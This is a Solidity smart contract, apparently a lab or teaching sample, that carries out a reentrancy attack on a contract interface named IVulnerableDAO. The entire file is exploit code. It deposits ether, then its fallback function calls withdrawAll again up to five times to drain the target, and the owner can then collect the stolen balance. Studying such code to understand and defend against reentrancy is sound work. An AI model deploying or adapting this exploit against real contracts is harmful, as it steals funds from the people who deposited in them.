pragma solidity ^0.4.19;

interface IVulnerableDAO {
    function deposit() external payable;
    function withdrawAll() external;
}

contract ReentrancyAttack {
    IVulnerableDAO public vulnerable;
    address public owner;
    uint public attackCount;

    constructor(address _target) public {
        vulnerable = IVulnerableDAO(_target);
        owner = msg.sender;
    }

    // Start the attack by depositing and immediately withdrawing
    function beginAttack() external payable {
        require(msg.sender == owner);
        require(msg.value >= 1 ether);
        vulnerable.deposit.value(msg.value)();
        vulnerable.withdrawAll();
    }

    // Fallback is triggered during reentrant call
    function () external payable {
        if (attackCount < 5) {
            attackCount++;
            vulnerable.withdrawAll();
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

